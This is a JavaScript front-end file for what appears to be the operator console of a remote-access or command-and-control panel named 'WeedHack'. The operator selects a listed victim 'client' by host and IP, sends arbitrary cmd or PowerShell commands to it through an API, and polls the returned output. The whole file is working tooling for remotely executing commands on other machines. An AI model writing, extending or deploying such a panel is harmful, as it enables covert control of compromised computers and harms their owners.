// language: JavaScript, file: public/js/cmd.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const target   = params.get('host') || `client ${clientId}`;
const ip       = params.get('ip') || '';

let shell = (params.get('shell') || '').toLowerCase();
if (!['cmd', 'powershell'].includes(shell)) shell = '';

let lastSeenId = 0;
let timer = null;
let poll = null;

$('bar-target').textContent = `${target} @ ${ip}`;
$('pick-target').textContent = `${target} @ ${ip}`;

function stamp() {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}
function write(text, cls) {
  const el = document.createElement('div');
  el.className = 'line' + (cls ? ' ' + cls : '');
  el.textContent = text;
  $('term').appendChild(el);
  $('term').scrollTop = $('term').scrollHeight;
}
const meta = (t) => write(`[${stamp()}] ${t}`, 'meta');

function paintShell() {
  $('bar-shell').textContent = shell;
  $('ps1').textContent = shell === 'powershell' ? 'PS>' : 'C:\\>';
  document.title = `WeedHack — ${shell} — ${target}`;
}

function enterConsole() {
  $('picker').style.display = 'none';
  $('term').style.display = '';
  $('input').style.display = '';
  $('swap').style.display = '';
  paintShell();

  meta(`attached to ${target} @ ${ip}`);
  meta(`shell = ${shell}`);
  meta('type a command and press enter');

  $('cmdline').focus();
  poll = setInterval(pollOnce, 2000);
  pollOnce();
}

document.querySelectorAll('.picker [data-shell]').forEach((b) => {
  b.addEventListener('click', () => {
    shell = b.dataset.shell;
    enterConsole();
  });
});

$('swap').addEventListener('click', () => {
  // reset to picker
  clearInterval(poll);
  lastSeenId = 0;
  $('term').innerHTML = '';
  $('term').style.display = 'none';
  $('input').style.display = 'none';
  $('swap').style.display = 'none';
  $('picker').style.display = 'grid';
  shell = '';
});

async function send(line) {
  if (!line.trim()) return;
  write(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${line}`, 'in');
  try {
    const r = await fetch(`/api/clients/${clientId}/exec`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ shell, line }),
    });
    const d = await r.json().catch(() => ({}));
    if (!r.ok) { write(`send failed: ${d.error || r.status}`, 'err'); return; }
    clearTimeout(timer);
    timer = setTimeout(pollOnce, 700);
  } catch {
    write('network error', 'err');
  }
}

async function pollOnce() {
  if (!clientId || !shell) return;
  try {
    const r = await fetch(`/api/clients/${clientId}/commands`);
    if (!r.ok) return;
    const rows = await r.json();
    const asc = rows.slice().reverse();
    for (const row of asc) {
      if (row.id <= lastSeenId) continue;
      lastSeenId = row.id;
      if (row.shell !== shell) continue;
      if (row.status === 'pending' || row.status === 'sent') {
        meta(`${shell} → ${row.line}  [sent]`);
        continue;
      }
      if (row.status === 'done') {
        write(`${shell === 'powershell' ? 'PS>' : 'C:\\>'} ${row.line}`, 'in');
        write(row.output || '(no output)');
      }
    }
  } catch {}
}

$('cmdline').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const v = $('cmdline').value;
    $('cmdline').value = '';
    send(v);
  }
});

if (shell) enterConsole();